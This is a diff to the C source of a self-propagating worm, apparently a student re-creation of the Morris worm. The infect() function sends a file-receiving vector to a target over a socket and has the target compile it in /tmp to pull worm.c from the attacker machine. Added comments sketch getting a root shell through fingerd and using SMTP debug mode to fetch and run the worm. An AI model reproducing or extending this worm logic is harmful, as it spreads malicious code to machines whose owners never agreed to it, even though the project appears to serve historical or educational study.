@@ -1,5 +1,6 @@
 /*
 TODO:
+- add send_file_over_socket.c functionality to attacker logic. For some reason I thought we only needed receive_file.c on the target
 - ensure that the correct BSD versions of the files are being pulled in (they arent right now)
 - ensure the "&" command actually runs the compiled programs (could use "./" instead?)
 - convert this file to old C so that this can be ran on BSD systems
@@ -202,7 +203,27 @@ void infect(char *ip, char *my_ip) {
 	// Send receive_file_bsd.c (vector) over
 	deploy_receive_file(sock, my_ip);
 
+    /* 
+    probably need to spin up send_file_over_socket.c on the attacker side here.
+    need to chat with changwoo abt this to clear up order of operations
+    */
+
+    /* 
+    Crazy 12:37am idea: Use SMTP debug vulnerablity to pull the files over instead...
+
+    Something like this:
+    - connect socket to fingerd server
+    - do movemail and whatever to get root shell
+    - in root shell, use smtp debug to tell attacking machine to send over 
+        worm.c and worm.h (and whatever else)
+    - compile and run worm.c, in theory completing self propogation
+
+    Would this work? Is this faithful to morris worm? Idk. Needs more thought
+    */
+
     // Compile and run receive_file, should pull in worm.c and worm.h from attacker
+    // also probably needs to pull over send_file_over_socket.c and send_file_over_socket.h
+    // still slightly unclear on how recive_file works
 	printf("[*] Compiling receive_file.c on target...\n");
 	write_to_sock(sock, "cc /tmp/receive_file.c -o /tmp/receive_file\n");
 	sleep(2);
